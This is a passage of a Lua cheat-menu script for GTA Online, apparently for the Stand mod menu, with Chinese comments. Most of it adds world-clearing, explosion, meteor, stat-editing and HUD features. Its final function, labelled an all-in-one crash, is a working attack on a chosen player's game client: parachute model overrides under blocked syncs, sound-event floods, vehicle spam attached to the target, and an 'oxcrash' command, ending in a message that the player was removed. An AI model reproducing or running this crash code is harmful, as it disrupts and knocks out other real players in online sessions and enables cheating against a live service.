        for _, obj in pairs(entities.get_all_objects_as_handles()) do

            entities.delete_by_handle(obj)

        end

        notification("物体池达到上限,正在清理...")

    end

end

end
L = filesystem.exists
L2 = filesystem.scripts_dir().."BeezyLib/functions.lua"
L3 = PLAYER
L3.L4 = L3.SET_PLAYER_MODEL
L5 = players
L5.L6 = L5.user_ped
--零食护甲编辑
    function MP_INDEX()
        return "MP" .. util.get_char_slot() .. "_"
    end
    
    function IS_MPPLY(Stat)
        if string.find(Stat, "MPPLY_") or string.find(Stat, "MP_") then
            return true
        else
            return false
        end
    end
    
    function ADD_MP_INDEX(Stat)
        if not IS_MPPLY(Stat) then
            Stat = MP_INDEX() .. Stat
        end
        return Stat
    end
    function STAT_SET_INT(Stat, Value)
        STATS.STAT_SET_INT(util.joaat(ADD_MP_INDEX(Stat)), Value, true)
    end
--超级清除
function super_clear()
local cleanse_entitycount = 0

for _, ped in pairs(entities.get_all_peds_as_handles()) do

    if ped ~= players.user_ped() and not PED.IS_PED_A_PLAYER(ped) then

        entities.delete_by_handle(ped)

        cleanse_entitycount += 1

    end

end

notification("已清除" .. cleanse_entitycount .. "个NPC")

cleanse_entitycount = 0

for _, veh in ipairs(entities.get_all_vehicles_as_handles()) do

    entities.delete_by_handle(veh)

    cleanse_entitycount += 1

    util.yield()

end

notification("已清除".. cleanse_entitycount .."个载具")

cleanse_entitycount = 0

for _, object in pairs(entities.get_all_objects_as_handles()) do

    entities.delete_by_handle(object)

    cleanse_entitycount += 1

end

notification("已清除" .. cleanse_entitycount .. "物体")

cleanse_entitycount = 0

for _, pickup in pairs(entities.get_all_pickups_as_handles()) do

    entities.delete_by_handle(pickup)

    cleanse_entitycount += 1

end

notification("已清除" .. cleanse_entitycount .. "可拾取物体")

local temp = memory.alloc(4)

for i = 0, 100 do

    memory.write_int(temp, i)

    PHYSICS.DELETE_ROPE(temp)

end

notification("已清除所有绳索")

local pos = ENTITY.GET_ENTITY_COORDS(players.user_ped())

MISC.CLEAR_AREA_OF_PROJECTILES(pos.x, pos.y, pos.z, 400, 0)

notification("已清除所有投掷物")

end
--生成球体
function aball()
    STREAMING.REQUEST_MODEL(bigasscircle)
    while not STREAMING.HAS_MODEL_LOADED(bigasscircle) do
        STREAMING.REQUEST_MODEL(bigasscircle)
        util.yield()
    end
    c1 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751)) --why tables when ctrl + c, ctrl + v
    c2 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751))
    c3 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751))
    c4 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751))
    c5 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751))
    c6 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751))
    c7 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751))
    c8 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751))
    c9 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751))
    c10 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751))
    c11 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751))
    c12 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751))
    c13 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751))
    c14 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751))
    c15 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751))
    c16 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751))
    c17 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751))
    c18 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751))
    c19 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751))
    ENTITY.FREEZE_ENTITY_POSITION(c1, true)
    ENTITY.FREEZE_ENTITY_POSITION(c2, true)
    ENTITY.FREEZE_ENTITY_POSITION(c3, true)
    ENTITY.FREEZE_ENTITY_POSITION(c4, true)
    ENTITY.FREEZE_ENTITY_POSITION(c5, true)
    ENTITY.FREEZE_ENTITY_POSITION(c6, true)
    ENTITY.FREEZE_ENTITY_POSITION(c7, true)
    ENTITY.FREEZE_ENTITY_POSITION(c8, true)
    ENTITY.FREEZE_ENTITY_POSITION(c9, true)
    ENTITY.FREEZE_ENTITY_POSITION(c10, true)
    ENTITY.FREEZE_ENTITY_POSITION(c11, true)
    ENTITY.FREEZE_ENTITY_POSITION(c12, true)
    ENTITY.FREEZE_ENTITY_POSITION(c13, true)
    ENTITY.FREEZE_ENTITY_POSITION(c14, true)
    ENTITY.FREEZE_ENTITY_POSITION(c15, true)
    ENTITY.FREEZE_ENTITY_POSITION(c16, true)
    ENTITY.FREEZE_ENTITY_POSITION(c17, true)
    ENTITY.FREEZE_ENTITY_POSITION(c18, true)
    ENTITY.FREEZE_ENTITY_POSITION(c19, true)
    ENTITY.SET_ENTITY_ROTATION(c2, 0.0, 0.0, 10.0, 1, true)
    ENTITY.SET_ENTITY_ROTATION(c3, 0.0, 0.0, 20.0, 1, true)
    ENTITY.SET_ENTITY_ROTATION(c4, 0.0, 0.0, 30.0, 1, true)
    ENTITY.SET_ENTITY_ROTATION(c5, 0.0, 0.0, 40.0, 1, true)
    ENTITY.SET_ENTITY_ROTATION(c6, 0.0, 0.0, 50.0, 1, true)
    ENTITY.SET_ENTITY_ROTATION(c7, 0.0, 0.0, 60.0, 1, true)
    ENTITY.SET_ENTITY_ROTATION(c8, 0.0, 0.0, 70.0, 1, true)
    ENTITY.SET_ENTITY_ROTATION(c9, 0.0, 0.0, 80.0, 1, true)
    ENTITY.SET_ENTITY_ROTATION(c10, 0.0, 0.0, 90.0, 1, true)
    ENTITY.SET_ENTITY_ROTATION(c11, 0.0, 0.0, 100.0, 1, true)
    ENTITY.SET_ENTITY_ROTATION(c12, 0.0, 0.0, 110.0, 1, true)
    ENTITY.SET_ENTITY_ROTATION(c13, 0.0, 0.0, 120.0, 1, true)
    ENTITY.SET_ENTITY_ROTATION(c14, 0.0, 0.0, 130.0, 1, true)
    ENTITY.SET_ENTITY_ROTATION(c15, 0.0, 0.0, 140.0, 1, true)
    ENTITY.SET_ENTITY_ROTATION(c16, 0.0, 0.0, 150.0, 1, true)
    ENTITY.SET_ENTITY_ROTATION(c18, 0.0, 0.0, 160.0, 1, true)
    ENTITY.SET_ENTITY_ROTATION(c19, 0.0, 0.0, 170.0, 1, true)
    ENTITY.SET_ENTITY_COORDS(players.user_ped(), -75.14637, -818.67236, 326.1751)
end
--删除球体
function shanqiu()
    entities.delete_by_handle(c1)
    entities.delete_by_handle(c2)
    entities.delete_by_handle(c3)
    entities.delete_by_handle(c4)
    entities.delete_by_handle(c5)
    entities.delete_by_handle(c6)
    entities.delete_by_handle(c7)
    entities.delete_by_handle(c8)
    entities.delete_by_handle(c9)
    entities.delete_by_handle(c10)
    entities.delete_by_handle(c11)
    entities.delete_by_handle(c12)
    entities.delete_by_handle(c13)
    entities.delete_by_handle(c14)
    entities.delete_by_handle(c15)
    entities.delete_by_handle(c16)
    entities.delete_by_handle(c17)
    entities.delete_by_handle(c18)
    entities.delete_by_handle(c19)
end
--开始流星雨
function start_meteor_shower()
    meteor_thr = util.create_thread(function(thr)
        while true do
            if not meteors then
                util.stop_thread()
            end
            local rand_1 = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.PLAYER_PED_ID(), math.random(-500, 500), math.random(-500, 500), 300.0)
            local rand_2 = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.PLAYER_PED_ID(), math.random(-500, 500), math.random(-500, 500), 0.0)
            local diff = {}
            local speed = 200
            diff.x = (rand_2['x'] - rand_1['x'])*speed
            diff.y = (rand_2['y'] - rand_1['y'])*speed
            diff.z = (rand_2['z'] - rand_1['z'])*speed
            local h = 3751297495
            request_model_load(h)
            rand_1.x = rand_1['x']
            rand_1.y = rand_1['y']
            rand_1.z = rand_1['z']
            local meteor = OBJECT.CREATE_OBJECT_NO_OFFSET(h, rand_1['x'], rand_1['y'], rand_1['z'], true, false, false)
            ENTITY.SET_ENTITY_HAS_GRAVITY(meteor, true)
            ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(meteor, 4, diff.x, diff.y, diff.z, true, false, true, true)
            ENTITY.APPLY_FORCE_TO_ENTITY(meteor, 2, diff.x, diff.y, diff.z, 0, 0, 0, 0, true, false, true, false, true)
            OBJECT.SET_OBJECT_PHYSICS_PARAMS(meteor, 100000, 5, 1, 0, 0, .5, 0, 0, 0, 0, 0)
            util.yield(100)
        end
    end)
end
--外星人入侵
function ufffo()
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    local r = num[math.random(#num)]
    c.x = math.random(0.0,1.0) >= 0.5 and c.x + r + 5 or c.x - r - 5 --set x coords
    c.y = math.random(0.0,1.0) >= 0.5 and c.y + r + 5 or c.y - r - 5 --set y coords
    c.z = c.z + r + 8 --set z coords
    STREAMING.REQUEST_MODEL(ufo)
    while not STREAMING.HAS_MODEL_LOADED(ufo) do
        STREAMING.REQUEST_MODEL(ufo)
        util.yield()
    end
    util.yield(2500)
    local spawnedufo = entities.create_object(ufo, c) --spawn ufo
    util.yield(500)
    local ufoc = ENTITY.GET_ENTITY_COORDS(spawnedufo) --get ufo pos
    local success, floorcoords
    repeat
        success, floorcoords = util.get_ground_z(ufoc.x, ufoc.y) --get floor pos
        util.yield()
    until success
    FIRE.ADD_EXPLOSION(ufoc.x, ufoc.y, floorcoords, exp, 100.0, true, false, 1.0, false) --explode at floor
    util.yield(1500)
    entities.delete_by_handle(spawnedufo) --delete ufo

    if not STREAMING.HAS_MODEL_LOADED(ufo) then
        notification("无法加载模型")
    end
end
--摇头丸
function request_control_of_entity_once(ent)
    if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent) and util.is_session_started() then
        local netid = NETWORK.NETWORK_GET_NETWORK_ID_FROM_ENTITY(ent)
        NETWORK.SET_NETWORK_ID_CAN_MIGRATE(netid, true)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ent)
    end
end
local cur_state = 1
function yaoptou()
local all_peds = entities.get_all_peds_as_handles()
    for k,ped in pairs(all_peds) do 
        if not PED.IS_PED_A_PLAYER(ped) then
            request_control_of_entity_once(ped)
            TASK.CLEAR_PED_TASKS(ped)
            local c
            if cur_state == 1 then 
                c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ped, 0.0, 1.0, 10.0)
            else
                c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ped, 0.0, 1.0, -10.0)
            end
            TASK.TASK_LOOK_AT_COORD(ped, c.x, c.y, c.z, -1, 0, 2)
        end
    end
    if cur_state == 1 then 
        cur_state = 2 
    else
        cur_state = 1
    end
    util.yield(100)
	end
--定点轰炸
function executeNuke(pos)
        for a = 0, 100, 4 do
            FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z + a, 8, 10.0, true, false, 1.0, false)
            util.yield(50)
        end
        FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z, 82, 10.0, true, false, 1.0, false)
        FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z , 82, 10.0, true, false, 1.0, false)
        FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z, 82, 10.0, true, false, 1.0, false)
        FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z, 82, 10.0, true, false, 1.0, false)
    end
function get_waypoint_v3()
        if HUD.IS_WAYPOINT_ACTIVE() then
            local blip = HUD.GET_FIRST_BLIP_INFO_ID(8)
            local waypoint_pos = HUD.GET_BLIP_COORDS(blip)

            local success, Zcoord = util.get_ground_z(waypoint_pos.x, waypoint_pos.y)
            local tries = 0
            while not success or tries <= 100 do
                success, Zcoord = util.get_ground_z(waypoint_pos.x, waypoint_pos.y)
                tries += 1
                util.yield_once()
            end
            if success then
                waypoint_pos.z = Zcoord
            end

            return waypoint_pos
        else
            notification("傻B,你都没标点")
        end
    end

--获取附近的车辆
function REQUEST_CONTROL(entity)
	if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(entity) then
		local netId = NETWORK.NETWORK_GET_NETWORK_ID_FROM_ENTITY(entity)
		NETWORK.SET_NETWORK_ID_CAN_MIGRATE(netId, true)
		NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity)
	end
	return NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(entity)
end
vect = {}
vect.new = function(x,y,z)
    return {['x'] = x, ['y'] = y, ['z'] = z or 0}
end

vect.subtract = function(a,b)
	return vect.new(a.x - b.x, a.y - b.y, a.z - b.z)
end

vect.add = function(a,b)
	return vect.new(a.x + b.x, a.y + b.y, a.z + b.z)
end

vect.mag = function(a)
	return math.sqrt(a.x^2 + a.y^2 + a.z^2)
end

vect.norm = function(a)
    local mag = vect.mag(a)
    return vect.mult(a, 1/mag)
end

vect.mult = function(a,b)
	return vect.new(a.x*b, a.y*b, a.z*b)
end

vect.dot = function (a,b)
	return (a.x * b.x + a.y * b.y + a.z * b.z)
end


vect.angle = function (a,b)
	return math.acos(vect.dot(a,b) / ( vect.mag(a) * vect.mag(b) ))
end


vect.dist = function(a,b)
    return vect.mag(vect.subtract(a, b))
end

vect.tostring = function(a)
    return "{" .. a.x .. ", " .. a.y .. ", " .. a.z .. "}"
end
function GET_NEARBY_VEHICLES(pid, radius) 
	local vehicles = {}
	local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
	local pos = ENTITY.GET_ENTITY_COORDS(p)
	local v = PED.GET_VEHICLE_PED_IS_IN(p, false)
	for _, vehicle in ipairs(entities.get_all_vehicles_as_handles()) do 
		local veh_pos = ENTITY.GET_ENTITY_COORDS(vehicle)
		if vehicle ~= v and vect.dist(pos, veh_pos) <= radius then table.insert(vehicles, vehicle) end
	end
	return vehicles
end
--按键显示
function newColor(R, G, B, A)

    return {r = R, g = G, b = B, a = A}

end
size = 0.03

boxMargin = size / 7

overlay_x = 0.0400

overlay_y = 0.1850

local x, y = directx.get_client_size()

local ratio = x/y

local spaceBarLength = 3

local spaceBarSlim = 1

local altSpaceBar = 0
local key_text_color = newColor(1, 1, 1, 1)

local background_colour = newColor(0, 0, 0, 0.2)

local pressed_background_colour = newColor(2.55/255, 2.55/255, 2.55/255, 0.5490196078431373)

local wasd = {

    [1]  = { keys = {44, 52, 85, 138, 141, 152, 205, 264},                                               pressed = false, key = 'Q',     show = true },

    [2]  = { keys = {32, 71, 77, 87, 129, 136, 150, 232},                                                pressed = false, key = 'W',     show = true },

    [3]  = { keys = {38, 46, 51, 54, 86, 103, 119, 153, 184, 206, 350, 351, 355, 356},                   pressed = false, key = 'E',     show = true },

    [4]  = { keys = {45, 80, 140, 250, 263, 310},                                                        pressed = false, key = 'R',     show = true },

    [5]  = { keys = {34 ,63, 89, 133, 147, 234, 338},                                                    pressed = false, key = 'A',     show = true },

    [6]  = { keys = {8, 31, 33, 72, 78, 88, 130, 139, 149, 151, 196, 219, 233, 268, 269, 302},           pressed = false, key = 'S',     show = true },

    [7]  = { keys = {9, 30, 35, 59, 64, 90, 134, 146, 148, 195, 218, 235, 266, 267, 278, 279, 339, 342}, pressed = false, key = 'D',     show = true },

    [8]  = { keys = {23, 49, 75, 145, 185, 251},                                                         pressed = false, key = 'F',     show = true },

    [9]  = { keys = {21, 61, 131, 155, 209, 254, 340, 352},                                              pressed = false, key = 'Shift', show = true },

    [10] = { keys = {36, 60, 62, 132, 224, 280, 281, 326, 341, 343},                                     pressed = false, key = 'Ctrl',  show = true },

    [11] = { keys = {18, 22, 55, 76, 102, 143, 179, 203, 216, 255, 298, 321, 328, 353},                  pressed = false, key = 'Space', show = true },

}
function key_display()

        for i = 1, #wasd do

            wasd[i].pressed = false

            for j = 1, #wasd[i].keys do

                if PAD.IS_CONTROL_PRESSED(2, wasd[i].keys[j]) then

                    wasd[i].pressed = true

                end

            end

        end

        for i = 1, #wasd - 3 do

            if wasd[i].show then

                directx.draw_rect(overlay_x + (boxMargin + size) * (i > 4 and i - 5 or i - 1), overlay_y + (i > 4 and (boxMargin + size * ratio) or 0)* 1.05, size, size * ratio, wasd[i].pressed and pressed_background_colour or background_colour)

                if not hideKey then

                    directx.draw_text(overlay_x + (boxMargin + size) * (i > 4 and i - 5 or i - 1)+ size * 0.45,(i > 4 and  overlay_y + (boxMargin + size * ratio)* 1.2 or  overlay_y*1.07) , wasd[i].key, 1, size *20, key_text_color, false)

                end

            end

        end

        if altShiftCtrl then

            if wasd[#wasd - 2].show then

                directx.draw_rect(overlay_x, overlay_y + (boxMargin + size)* ratio * 2,(boxMargin + size) - boxMargin, size * ratio / 2, wasd[#wasd - 2].pressed and pressed_background_colour or background_colour)

            end

            if wasd[#wasd - 1].show then

                directx.draw_rect(overlay_x, overlay_y + (boxMargin + size)* ratio * 2.5,(boxMargin + size) - boxMargin, size * ratio / 2, wasd[#wasd - 1].pressed and pressed_background_colour or background_colour)

            end

        else

            for i = 9, 10 do

                if wasd[i].show then

                directx.draw_rect(overlay_x - (boxMargin + size), overlay_y + (boxMargin + size * ratio) * (i - 8) * 1.05, size, size * ratio, wasd[i].pressed and pressed_background_colour or background_colour)

                if not hideKey then

                    directx.draw_text(overlay_x - (boxMargin + size)+ size * 0.45,(i > 4 and  overlay_y + (boxMargin + size * ratio) * (i - 8)* 1.2 or  overlay_y*1.07) , wasd[i].key, 1, size *20, key_text_color, false)

                end

                end

            end

        end

        if wasd[#wasd].show then

            directx.draw_rect(overlay_x + (boxMargin + size) * altSpaceBar, overlay_y + (boxMargin + size)* ratio * 2,(boxMargin + size) * spaceBarLength - boxMargin, size * ratio / spaceBarSlim, wasd[#wasd].pressed and pressed_background_colour or background_colour)

        end

	end


--主机序列
function x1x()
inviciamountint = 0
            for pid = 0, 31 do
                if players.exists(pid) and pid ~= players.user() then
                    local pped = players.user_ped(pid)
                    if pped ~= 0 then
                        if players.is_marked_as_modder(pid) then --is_marked_as_modder
                            inviciamountint = inviciamountint + 1
                        end
                    end
                end
local ente
                    local ent1e = players.user_ped()
                    local ent2e = PED.GET_VEHICLE_PED_IS_USING(players.user_ped())
                    if PED.IS_PED_IN_ANY_VEHICLE(ent1e,true) then
                        ente = ent2e
                    else
                        ente = ent1e
                    end
                    local speede = ENTITY.GET_ENTITY_SPEED(ente)
                    local speedcalce = speede * 3.6
                    myspeed1e = math.ceil(speedcalce)
            end
                inviciamountintt = inviciamountint
            draw_string(string.format("~h~~o~"..myspeed1e.." ~w~KM/H"), 0.17,0.788, 0.4,0)
            draw_string(string.format("~h~"..os.date("%X")), 0.17,0.815, 0.4,0)    
            draw_string(string.format("~h~战局玩家: ~g~"..#players.list()), 0.17,0.842, 0.4,0) 
            draw_string(string.format("~h~作弊玩家: ~r~"..inviciamountintt), 0.17,0.869, 0.4,0) 
			if PLAYER.GET_PLAYER_NAME(players.get_host()) == "**Invalid**" then
			draw_string(string.format("~h~战局主机: ~y~没有人"), 0.17,0.896, 0.4,0)
			else
            draw_string(string.format("~h~战局主机: ~y~"..players.get_name(players.get_host())), 0.17,0.896, 0.4,0)
			end
			if PLAYER.GET_PLAYER_NAME(players.get_script_host()) == "**Invalid**" then
			draw_string(string.format("~h~脚本主机: ~b~没有人"), 0.17,0.923, 0.4,0)
			else
            draw_string(string.format("~h~脚本主机: ~b~"..players.get_name(players.get_script_host())), 0.17,0.923, 0.4,0)
			end
						local hostxvlie = players.get_host_queue_position(players.user())
			if hostxvlie == 0 then
			draw_string(string.format("~h~~q~你现在是战局主机"), 0.17,0.95, 0.4,0) 
			else
			draw_string(string.format("~h~~p~你的主机优先度:~q~ "..hostxvlie), 0.17,0.95, 0.4,0) 
			end
			
end
--俄罗斯转盘
randomizer = function(x)
    local r = math.random(1,3)
    return x[r]
end

array = {"1","1","2"}

--aio崩溃
local getEntityCoords = ENTITY.GET_ENTITY_COORDS
local getPlayerPed = PLAYER.GET_PLAYER_PED
function aaio(PlayerID)
if players.exists(PlayerID) then
        local mdl = util.joaat("apa_mp_apa_yacht")
        local user = players.user_ped()
		local old_pos = ENTITY.GET_ENTITY_COORDS(user, false)
        BlockSyncs(PlayerID, function()
		util.yield(250)
            WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user, 0xFBAB5776, 100, false)
            PLAYER.SET_PLAYER_HAS_RESERVE_PARACHUTE(players.user())
            PLAYER.SET_PLAYER_RESERVE_PARACHUTE_MODEL_OVERRIDE(players.user(), mdl)
            util.yield(50)
            local pos = players.get_position(PlayerID)
            pos.z += 300
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(user)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(user, pos.x, pos.y, pos.z, false, false, false)
            repeat
                util.yield()
            until PED.GET_PED_PARACHUTE_STATE(user) == 0
            PED.FORCE_PED_TO_OPEN_PARACHUTE(user)
            util.yield(50)
            TASK.CLEAR_PED_TASKS(user)
            util.yield(50)
            PED.FORCE_PED_TO_OPEN_PARACHUTE(user)
            repeat
                util.yield()
            until PED.GET_PED_PARACHUTE_STATE(user) ~= 1
            pcall(TASK.CLEAR_PED_TASKS_IMMEDIATELY, user)
            PLAYER.CLEAR_PLAYER_RESERVE_PARACHUTE_MODEL_OVERRIDE(players.user())
            pcall(ENTITY.SET_ENTITY_COORDS, user, old_pos.x,old_pos.y,old_pos.z, false, false)
        end)
    end
if players.exists(PlayerID) then
local user = players.user()
        local user_ped = players.user_ped()
        local pos = players.get_position(user)
        BlockSyncs(PlayerID, function() 
            util.yield(100)
            PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), 0xFBF7D21F)
            WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
            TASK.TASK_PARACHUTE_TO_TARGET(user_ped, pos.x, pos.y, pos.z)
            util.yield()
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(user_ped)
            util.yield(250)
            WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
            PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
            util.yield(1000)
            for i = 1, 5 do
                util.spoof_script("freemode", SYSTEM.WAIT)
            end
            ENTITY.SET_ENTITY_HEALTH(user_ped, 0)
            NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(pos.x,pos.y,pos.z, 0, false, false, 0)
        end)
    end
if players.exists(PlayerID) then
local time = util.current_time_millis() + 2000
        while time > util.current_time_millis() do
            local pos=ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID), true)
            for i = 1, 10 do
                AUDIO.PLAY_SOUND_FROM_COORD(-1,"10s",pos.x,pos.y,pos.z,"MP_MISSION_COUNTDOWN_SOUNDSET",true, 70, false)
            end
            util.yield(0)
        end
    end 
if players.exists(PlayerID) then
local time = util.current_time_millis() + 2000
        while time > util.current_time_millis() do
            local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID), true)
            for i = 1, 20 do
                AUDIO.PLAY_SOUND_FROM_COORD(-1, 'Event_Message_Purple', pos.x, pos.y, pos.z, 'GTAO_FM_Events_Soundset', true, 1000, false)
                AUDIO.PLAY_SOUND_FROM_COORD(-1, '5s', pos.x, pos.y, pos.z, 'GTAO_FM_Events_Soundset', true, 1000, false)
            end
            util.yield()
        end	
    end
if players.exists(PlayerID) then
              local TPP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
              local pos = ENTITY.GET_ENTITY_COORDS(TPP, true)
              pos.z = pos.z + 10
              veh = entities.get_all_vehicles_as_handles()
              
            for i = 1, #veh do
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh[i])
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh[i], pos.x,pos.y,pos.z, ENTITY.GET_ENTITY_HEADING(TPP), 10)
            TASK.TASK_VEHICLE_TEMP_ACTION(TPP, veh[i], 18, 999)
            TASK.TASK_VEHICLE_TEMP_ACTION(TPP, veh[i], 16, 999)
            end
        end
if players.exists(PlayerID) then
    local hashes = {1492612435, 3517794615, 3889340782, 3253274834}
    local vehicles = {}
    for i = 1, 4 do
        util.create_thread(function()
            RqModel(hashes[i])
            local pcoords = getEntityCoords(getPlayerPed(PlayerID))
            local veh =  VEHICLE.CREATE_VEHICLE(hashes[i], pcoords.x, pcoords.y, pcoords.z, math.random(0, 360), true, true, false)
            for a = 1, 20 do NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh) end
            VEHICLE.SET_VEHICLE_MOD_KIT(veh, 0)
            for j = 0, 49 do
                local mod = VEHICLE.GET_NUM_VEHICLE_MODS(veh, j) - 1
                VEHICLE.SET_VEHICLE_MOD(veh, j, mod, true)
                VEHICLE.TOGGLE_VEHICLE_MOD(veh, mod, true)
            end
            for j = 0, 20 do
                if VEHICLE.DOES_EXTRA_EXIST(veh, j) then VEHICLE.SET_VEHICLE_EXTRA(veh, j, true) end
            end
            VEHICLE.SET_VEHICLE_TYRES_CAN_BURST(veh, false)
            VEHICLE.SET_VEHICLE_WINDOW_TINT(veh, 1)
            VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT_INDEX(veh, 1)
            VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(veh, " ")
            for ai = 1, 50 do
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
                pcoords = getEntityCoords(getPlayerPed(PlayerID))
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh, pcoords.x, pcoords.y, pcoords.z, false, false, false)
                util.yield()
            end
            vehicles[#vehicles+1] = veh
        end)
    end
	end
if players.exists(PlayerID) then	
		for pedp_crash = 2 , 6 do
	pedp = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    pos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
    dune = CreateVehicle(410882957,pos,ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(dune, true)
    dune1 = CreateVehicle(2971866336,pos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(dune1, true)
    barracks = CreateVehicle(3602674979,pos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(barracks, true)
    barracks1 = CreateVehicle(444583674,pos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(barracks1, true)
    dunecar = CreateVehicle(2971866336,pos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(dunecar, true)
    dunecar1 = CreateVehicle(3602674979,pos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(dunecar1, true)
    dunecar2 = CreateVehicle(444583674,pos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(dunecar2, true)
    barracks3 = CreateVehicle(4244420235,pos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(barracks3, true)
    barracks31 = CreateVehicle(3602674979,pos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(barracks31, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(barracks3, dunecar, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(barracks31, dunecar, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(barracks, dunecar, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(barracks1, dunecar, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(dune, dunecar, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(dune1, dunecar, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(dunecar1, dunecar, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(dunecar2, dunecar, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(dunecar, pedp, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    util.yield(5000)
	for i = 0, 100  do
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(dunecar, pos.x, pos.y, pos.z, false, true, true)
			util.yield(10)
		end
        util.yield(2000)
        entities.delete_by_handle(dune)
        entities.delete_by_handle(dune1)
        entities.delete_by_handle(barracks)
        entities.delete_by_handle(barracks1)
        entities.delete_by_handle(dunecar)
        entities.delete_by_handle(dunecar1)
        entities.delete_by_handle(dunecar2)
        entities.delete_by_handle(barracks3)
        entities.delete_by_handle(barracks31)
    end
end
            if players.exists(PlayerID) then
            menu.trigger_commands("oxcrash " .. players.get_name(PlayerID))
            end
            util.yield(100)
            if players.exists(PlayerID) then
                notification("崩不掉")
          else
            notification("成功移除此玩家")
            end
            notification("ojbk")
end
